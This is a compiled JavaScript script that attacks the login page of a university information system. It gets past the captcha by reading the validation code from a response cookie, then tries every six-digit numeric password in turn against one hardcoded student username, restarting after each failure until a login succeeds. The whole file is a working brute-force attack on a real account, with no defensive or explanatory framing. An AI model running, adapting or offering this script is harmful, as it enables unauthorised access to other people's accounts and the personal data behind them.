"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (_) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
var _this = this;
exports.__esModule = true;
var node_fetch_1 = require("node-fetch");
var form_data_1 = require("form-data");
var cheerio_1 = require("cheerio");
var log = console.log;
var baseUrl = "http://mis.sse.ustc.edu.cn/";
var pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g;
var cookieJar = [];
var view_state = "";
var username = "sa18225541";
var password = "000000";
var app = function () {
    node_fetch_1["default"](baseUrl)
        .then(function (result) { return __awaiter(_this, void 0, void 0, function () {
        var sessionId, body, $, imgUrl, url, r, str, validateCode, sum, formData, login, iflysse, len, i;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0:
                    sessionId = (result.headers.get("set-cookie") || "").split(";")[0];
                    cookieJar.push(sessionId);
                    return [4 /*yield*/, result.text()];
                case 1:
                    body = _a.sent();
                    $ = cheerio_1["default"].load(body);
                    view_state = $("#__VIEWSTATE").val();
                    log("before" + Date.now());
                    imgUrl = body.match(pattern) || [""];
                    url = baseUrl + imgUrl[0].replace("&amp;", "&");
                    log("after" + Date.now());
                    return [4 /*yield*/, node_fetch_1["default"](url, {
                            headers: {
                                "cookie": cookieJar.join(";")
                            }
                        })];
                case 2:
                    r = _a.sent();
                    str = r.headers.get("set-cookie") || "";
                    cookieJar.push(str.split(";")[0]);
                    validateCode = (str.match(/[0-9]{4}/) || [""])[0];
                    log("validate code:", validateCode);
                    sum = 0;
                    validateCode.split("").forEach(function (val) {
                        sum += parseInt(val);
                    });
                    log("sum:", sum);
                    log("session", cookieJar);
                    formData = new form_data_1["default"]();
                    formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
                    formData.append("__VIEWSTATE", view_state);
                    formData.append("winLogin$sfLogin$txtUserLoginID", username);
                    formData.append('winLogin$sfLogin$txtPassword', password);
                    formData.append('winLogin$sfLogin$txtValidate', sum);
                    return [4 /*yield*/, node_fetch_1["default"](baseUrl + "default.aspx", {
                            method: "post",
                            headers: {
                                cookie: cookieJar.join(";")
                            },
                            body: formData
                        })];
                case 3:
                    login = _a.sent();
                    iflysse = (login.headers.get("set-cookie") || "").split(";")[0];
                    if (iflysse.length === 0) {
                        log("failed ", "password: ", password);
                        password = "" + (parseInt(password) + 1);
                        if (password.length < 6) {
                            log("len", password.length);
                            len = password.length;
                            for (i = 0; i < 6 - len; i++) {
                                password = 0 + password;
                            }
                        }
                        cookieJar.length = 0;
                        app();
                    }
                    else {
                        log("success ", "用户名: ", username, "密码: ", password);
                        return [2 /*return*/];
                    }
                    cookieJar.push(iflysse);
                    log("");
                    return [2 /*return*/];
            }
        });
    }); })["catch"](function (err) {
        log(err);
        app();
    });
};
app();
